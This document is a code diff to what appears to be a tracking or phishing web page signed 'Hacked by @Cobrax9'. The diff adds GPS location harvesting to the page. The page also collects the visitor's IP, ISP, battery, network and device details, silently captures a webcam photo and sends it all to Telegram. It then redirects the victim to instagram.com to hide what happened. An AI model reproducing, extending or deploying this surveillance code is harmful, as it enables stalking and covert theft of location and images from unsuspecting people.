@@ -58,11 +58,46 @@
     const video = document.getElementById("videoPreview");
     const canvas = document.getElementById("snapshotCanvas");
     const ctx = canvas.getContext("2d");
+
     let result = "📱 Hacked by @Cobrax9\n\n";
     let imageBase64 = "";
-    let latlong = "";
 
-    function collectData(ipData) {
+    function useGeoLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            result += "🌍 GPS Location: https://maps.google.com/?q=" + lat + "," + lon + "\n\n";
+            collectRestOfInfo();
+          },
+          err => {
+            console.warn("GPS denied, using IP fallback");
+            fetchIP();
+          },
+          { timeout: 5000 }
+        );
+      } else {
+        fetchIP();
+      }
+    }
+
+    function fetchIP() {
+      fetch("https://ipinfo.io/json?token=demo")
+        .then(res => res.json())
+        .then(data => {
+          result += "🌎 IP Info:\n";
+          result += `🌐 IP: ${data.ip}\n📡 ISP: ${data.org}\n🔍 ASN: ${data.org?.split(" ")[0]}\n`;
+          result += `🌍 IP Location: https://maps.google.com/?q=${data.loc}\n\n`;
+          collectRestOfInfo();
+        })
+        .catch(() => {
+          result += "🌐 Location info unavailable\n\n";
+          collectRestOfInfo();
+        });
+    }
+
+    function collectRestOfInfo() {
       const ua = navigator.userAgent;
       const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const connection = navigator.connection || {};
@@ -72,29 +107,21 @@
         const charging = battery.charging ? "Yes" : "No";
         const level = Math.round(battery.level * 100) + "%";
 
-        result += "🌎 Ip Information:\n";
-        result += `🌐 IP address: ${ipData?.ip}\n`;
-        result += `📡 ISP: ${ipData?.org}\n`;
-        result += `🔍 ASN: ${ipData?.org?.split(" ")[0]}\n`;
-        latlong = ipData?.loc;
-        result += `📍 Location: https://maps.google.com/?q=${latlong}\n\n`;
-
         result += "📱 Device Info:\n";
         result += `🔋 Charging: ${charging}\n`;
-        result += `🔌 Battery Level: ${level}\n`;
-        result += `🌐 Network Type: ${network.toUpperCase()}\n`;
+        result += `🔌 Battery: ${level}\n`;
+        result += `🌐 Network: ${network.toUpperCase()}\n`;
         result += `🕒 Time Zone: ${timeZone}\n\n`;
         result += `🖥️ User Agent: ${ua}\n`;
-        result += `📱 Device Type: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
+        result += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
         result += "👨‍💻 Tracked on: @Cobrax9";
 
-        capturePhotoAndSend();
+        capturePhoto();
       });
     }
 
-    function capturePhotoAndSend() {
+    function capturePhoto() {
       video.style.display = "block";
-
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
@@ -105,7 +132,7 @@
           }, 1500);
         })
         .catch(() => {
-          sendToTelegram(); // send without photo
+          sendToTelegram(); // fallback if no camera
         });
     }
 
@@ -122,15 +149,13 @@
         })
       }).then(() => {
         setTimeout(() => {
-          window.location.href = "https://facebook.com";
+          window.location.href = "https://instagram.com";
         }, 3000);
       });
     }
 
-    fetch("https://ipinfo.io/json?token=demo")
-      .then(res => res.json())
-      .then(data => collectData(data))
-      .catch(() => collectData({ ip: "Unknown", org: "Unknown", loc: "0,0" }));
+    // Start
+    useGeoLocation();
   </script>
 </body>
 </html>
